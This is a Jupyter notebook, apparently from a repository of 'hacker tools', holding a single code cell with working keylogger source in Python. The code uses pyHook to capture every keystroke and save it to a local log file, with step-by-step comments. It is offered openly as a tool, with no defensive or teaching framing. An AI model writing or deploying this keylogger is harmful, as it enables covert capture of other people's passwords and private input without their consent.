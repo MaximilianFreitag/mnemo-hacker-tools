{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Install PyHook using pip install pyhook.\n",
    "#Import PyHook and create a function that will handle the keystrokes.\n",
    "#Set up the hook to capture keystrokes using PyHook.\n",
    "#Save the keystrokes to a log file.\n",
    "\n",
    "import pyHook, pythoncom, logging\n",
    "\n",
    "# Set up logging\n",
    "log_file = \"keylogger.txt\"\n",
    "logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')\n",
    "\n",
    "# Define the function to handle keystrokes\n",
    "def OnKeyboardEvent(event):\n",
    "    logging.info(chr(event.Ascii))\n",
    "\n",
    "# Set up the hook to capture keystrokes\n",
    "hooks_manager = pyHook.HookManager()\n",
    "hooks_manager.KeyDown = OnKeyboardEvent\n",
    "hooks_manager.HookKeyboard()\n",
    "\n",
    "# Start the event loop\n",
    "pythoncom.PumpMessages()\n",
    "\n",
    "\n",
    "#This code will capture all keystrokes and save them to a log file named \"keylogger.txt\". "
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
